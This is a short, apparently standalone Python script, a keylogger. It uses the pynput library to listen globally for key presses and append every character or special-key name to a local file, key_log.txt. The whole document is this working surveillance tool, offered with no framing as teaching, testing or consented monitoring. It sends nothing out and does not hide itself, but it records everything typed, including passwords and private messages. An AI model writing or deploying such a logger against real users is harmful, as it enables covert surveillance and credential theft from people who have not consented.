from pynput import keyboard

# Define the log file path
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as file:
        # Handle special keys
        if hasattr(key, 'char'):
            file.write(str(key.char))
        else:
            file.write(f'[{str(key)}]')

# Define the on_press event
def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error: {e}")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
